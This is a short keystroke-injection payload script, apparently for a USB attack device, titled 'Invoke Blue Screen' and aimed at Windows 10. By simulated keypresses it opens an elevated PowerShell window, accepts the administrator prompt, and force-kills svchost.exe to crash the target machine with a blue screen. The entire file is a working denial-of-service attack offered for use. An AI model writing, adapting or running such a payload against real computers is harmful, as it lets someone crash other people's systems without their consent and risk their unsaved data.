// =============================================================================
// Title: Invoke Blue Screen
// Author: @beigeworm | https://github.com/beigeworm
// Description: Causes a blue screen on a target system.
// Target: Windows 10
// =============================================================================

// =============================================================================
// This is a dangerous script - Be Careful!

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("powershell");
press("control shift enter");
delay(2000);
press("left enter");
delay(5000);
type("taskkill /f /im svchost.exe\n"); //instantly kills svchost.exe which causes a bluescreen.